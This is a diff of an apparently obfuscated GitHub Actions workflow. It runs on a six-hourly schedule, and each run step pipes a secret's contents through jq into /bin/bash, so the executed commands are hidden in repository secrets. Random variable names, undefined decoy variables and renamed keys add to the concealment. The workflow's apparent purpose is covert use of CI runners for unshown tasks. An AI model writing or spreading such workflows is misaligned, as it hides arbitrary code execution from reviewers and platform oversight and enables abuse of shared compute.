@@ -1,27 +1,32 @@
 name: troubleddreary
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 1/6 * * *'
+    - cron: '29 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: troubleddreary
         env:
-          yto8818: ${{ secrets.yto8818 }}
+          tqkbq31: ${{ secrets.tqkbq31 }}
         run: |
-          echo $yto8818 | jq -r .xkf2695 | /bin/bash
-          echo $kemoy95891 | jq -r .jgkce46583 | /bin/bash
-          echo $xj74767 | jq -r .f129 | /bin/bash
-          echo $ajaq94 | jq -r .wpzuw78 | /bin/bash
-          echo $k0 | jq -r .svrg39 | /bin/bash
-          echo $admyy10315 | jq -r .yq718 | /bin/bash
-          echo $ydxwz0 | jq -r .ro37748 | /bin/bash
-          echo $bpg64432 | jq -r .cucl869 | /bin/bash
-          echo $oh922 | jq -r .yr74 | /bin/bash
-          echo $g1 | jq -r .fi3508 | /bin/bash
-          echo $e8407 | jq -r .vcv9997 | /bin/bash
+          echo $tqkbq31 | jq -r .ymn7 | /bin/bash
+          echo $svhr8 | jq -r .skszt93857 | /bin/bash
+          echo $zozz8394 | jq -r .ahqn97 | /bin/bash
+          echo $e3959 | jq -r .inczr743 | /bin/bash
+          echo $mkbzl818 | jq -r .s854 | /bin/bash
+          echo $fea9063 | jq -r .t10 | /bin/bash
+          echo $pxsh797 | jq -r .wskw6389 | /bin/bash
+          echo $hg32 | jq -r .ivhqs8 | /bin/bash
+          echo $ouqt8 | jq -r .c93 | /bin/bash
+          echo $qhb59731 | jq -r .ha93099 | /bin/bash
+          echo $p8 | jq -r .yrb13 | /bin/bash
+          echo $k50271 | jq -r .mvwy3 | /bin/bash
+          echo $om49 | jq -r .tv6831 | /bin/bash
+          echo $de12294 | jq -r .x5848 | /bin/bash
 
